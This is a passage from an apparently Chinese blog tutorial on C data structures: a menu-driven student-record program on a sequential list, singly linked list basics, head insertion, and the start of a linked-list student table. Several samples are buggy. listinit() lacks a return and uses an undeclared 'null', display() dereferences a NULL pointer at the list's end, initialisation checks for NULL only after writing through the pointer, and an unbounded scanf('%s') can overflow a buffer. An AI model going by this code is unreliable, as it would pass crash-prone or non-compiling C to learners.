function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%c\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>ch<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tSqlList L<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ch<span class=\"token operator\">==</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入顺序表的最大长度:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">init</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">,</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//初始化顺序表</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ch<span class=\"token operator\">==</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请先初始化顺序表！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入错误！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>ch<span class=\"token operator\">==</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token comment\">//功能表</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n请选择操作:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"===============================\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|1.添加学生信息               |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|2.显示所有学生信息           |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|3.查询指定学生信息           |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|4.显示指定位次学生信息       |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|5.将新加入学生信息插入       |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|6.删除指定位次学生信息       |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|7.显示学生现有学生人数       |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|8.结束查询                   |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"===============================\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入操作序号:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">int</span> flag<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"添加学生信息:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入学生人数:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">int</span> n<span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">></span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入的学生人数超过顺序表的最大长度！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"添加失败！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t\t\t\t\t<span class=\"token function\">add</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"添加成功！\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"显示所有学生信息:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入要查询的学生姓名:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">char</span> name<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">search</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"查询成功！\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入要查询的学生位次:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">int</span> rank<span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>rank<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">search1</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">,</span>rank<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"查询成功！\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"将新加入学生信息插入:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入要插入的学生位次:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">int</span> rank1<span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>rank1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">,</span>rank1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"插入成功！\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">6</span><span class=\"token operator\">:</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"删除指定位次学生信息:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入要删除的学生位次:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">int</span> rank2<span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>rank2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">del</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">,</span>rank2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"删除成功！\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">7</span><span class=\"token operator\">:</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"显示学生现有学生人数:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">statistics</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">8</span><span class=\"token operator\">:</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"结束查询!我们下次再见\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t    <span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\t\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"单链表的基础设计（c语言实现）\"><a href=\"#单链表的基础设计（c语言实现）\" class=\"headerlink\" title=\"单链表的基础设计（c语言实现）\"></a>单链表的基础设计（c语言实现）</h2><h3 id=\"1、单链表概念加设计\"><a href=\"#1、单链表概念加设计\" class=\"headerlink\" title=\"1、单链表概念加设计\"></a>1、单链表概念加设计</h3><p>对于链路的每个结点我们使用结构体来设计</p>\n<p>单链表是一种链式存储的数据结构，链表中的数据结构是以结点来表示的</p>\n<p>结点&#x3D;元素+指针</p>\n<p>注：链表的结尾NEXT指向NULL（空），因为结尾没有任何可以指向的空间了</p>\n<p>对于一个单链表的结点定义，可以使用代码来描述</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token comment\">//定义结点类型 </span>\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Node</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">int</span> data<span class=\"token punctuation\">;</span><span class=\"token comment\">//数据类型是什么都行 </span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">Node</span> <span class=\"token operator\">*</span>next<span class=\"token punctuation\">;</span><span class=\"token comment\">//指针域 </span>\n<span class=\"token punctuation\">&#125;</span>Node<span class=\"token punctuation\">,</span><span class=\"token operator\">*</span>LinkedList<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//Node表示结点的类型，Linkedlist表示指向Node结点类型的指针类型 </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"2、单链表的初始化\"><a href=\"#2、单链表的初始化\" class=\"headerlink\" title=\"2、单链表的初始化\"></a>2、单链表的初始化</h3><p>链表也是需要初始化的操作，初始化是创建一个单链表的前置结点，并向后逐步添加结点，一般来说，就是申请结点空间</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">LinkedList <span class=\"token function\">listinit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\tNode <span class=\"token operator\">*</span>L<span class=\"token punctuation\">;</span>\n\tL<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>Node<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>Node<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//申请空间</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>L<span class=\"token operator\">==</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//判断空间是否申请成功</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\tL<span class=\"token operator\">-></span>next<span class=\"token operator\">=</span>null<span class=\"token punctuation\">;</span><span class=\"token comment\">//指针指向空</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>注：这个判断过程在现在的环境中基本用不上，但是得有</p>\n<h3 id=\"3、创建单链表（头插入法）\"><a href=\"#3、创建单链表（头插入法）\" class=\"headerlink\" title=\"3、创建单链表（头插入法）\"></a>3、创建单链表（头插入法）</h3><p>上面的初始化结束后遍可以创建了</p>\n<p>单链表的创建分为头插入法和尾插入法，两者都是利用指针指向下一个结点元素方式逐个创建，不过使用头插入法得到的结果是逆序的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220913140633812.png\" alt=\"image-20220913140633812\"></p>\n<p>类似这种，讲数据插在链表的表头</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220913151836019.png\" alt=\"image-20220913151836019\"></p>\n<p>c语言实现</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Link</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//定义结点类型 </span>\n\t<span class=\"token keyword\">int</span> data<span class=\"token punctuation\">;</span><span class=\"token comment\">//数据类型 </span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">Link</span> <span class=\"token operator\">*</span>next<span class=\"token punctuation\">;</span><span class=\"token comment\">//指针域 </span>\n<span class=\"token punctuation\">&#125;</span>link<span class=\"token punctuation\">,</span><span class=\"token operator\">*</span>Linklist<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//link表示结点的类型，LinkedList表示指向link结点类型的指针类型</span>\n\n<span class=\"token comment\">//头插法建立单链表 </span>\nLinklist <span class=\"token function\">listcreeth</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\tlink <span class=\"token operator\">*</span>p<span class=\"token punctuation\">;</span>\n\tp<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>link <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>link<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tp<span class=\"token operator\">-></span>next<span class=\"token operator\">=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//初始化一个空链表 </span>\n\t\n\t<span class=\"token keyword\">int</span> x<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token constant\">EOF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\tlink <span class=\"token operator\">*</span>l<span class=\"token punctuation\">;</span>\n\t\tl<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>link <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>link<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tl<span class=\"token operator\">-></span>data<span class=\"token operator\">=</span>x<span class=\"token punctuation\">;</span>\n\t\tl<span class=\"token operator\">-></span>next<span class=\"token operator\">=</span>p<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n\t\tp<span class=\"token operator\">-></span>next<span class=\"token operator\">=</span>l<span class=\"token punctuation\">;</span> \n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token keyword\">void</span> <span class=\"token function\">display</span><span class=\"token punctuation\">(</span>link <span class=\"token operator\">*</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    link <span class=\"token operator\">*</span>temp<span class=\"token operator\">=</span>p<span class=\"token punctuation\">;</span><span class=\"token comment\">//将temp指针重新指向头结点</span>\n    <span class=\"token comment\">//只要temp指针指向的结点的next不是Null，就执行输出语句。</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    \ttemp<span class=\"token operator\">=</span>temp<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d \"</span><span class=\"token punctuation\">,</span>temp<span class=\"token operator\">-></span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\tlink <span class=\"token operator\">*</span>p<span class=\"token operator\">=</span><span class=\"token function\">listcreeth</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">display</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220913213253645.png\" alt=\"image-20220913213253645\" style=\"zoom:150%;\" />\n\n\n\n<h3 id=\"链表实现学生表\"><a href=\"#链表实现学生表\" class=\"headerlink\" title=\"链表实现学生表\"></a>链表实现学生表</h3><pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span> </span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Student</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">char</span> no<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//学号</span>\n\t<span class=\"token keyword\">char</span> name<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//姓名</span>\n\t<span class=\"token keyword\">int</span> graeds<span class=\"token punctuation\">;</span><span class=\"token comment\">//成绩</span>\n<span class=\"token punctuation\">&#125;</span>student<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Node</span>\n<span class=\"token punctuation\">&#123;</span>\n\tstudent data<span class=\"token punctuation\">;</span><span class=\"token comment\">//数据域</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">Node</span> <span class=\"token operator\">*</span>next<span class=\"token punctuation\">;</span><span class=\"token comment\">//指针域</span>\n<span class=\"token punctuation\">&#125;</span>Link<span class=\"token punctuation\">,</span><span class=\"token operator\">*</span>LinkList<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">linkinit</span><span class=\"token punctuation\">(</span>LinkList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//初始化</span>\n\tL<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>LinkList<span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>Link<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tL<span class=\"token operator\">-></span>next<span class=\"token operator\">=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>L<span class=\"token operator\">==</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"初始化失败！！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">//添加学生信息</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">linkadd</span><span class=\"token punctuation\">(</span>LinkList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\tLinkList p<span class=\"token operator\">=</span>L<span class=\"token punctuation\">;</span>\n\tLinkList q<span class=\"token punctuation\">;</span>\n\tq<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>LinkList<span class=\"token 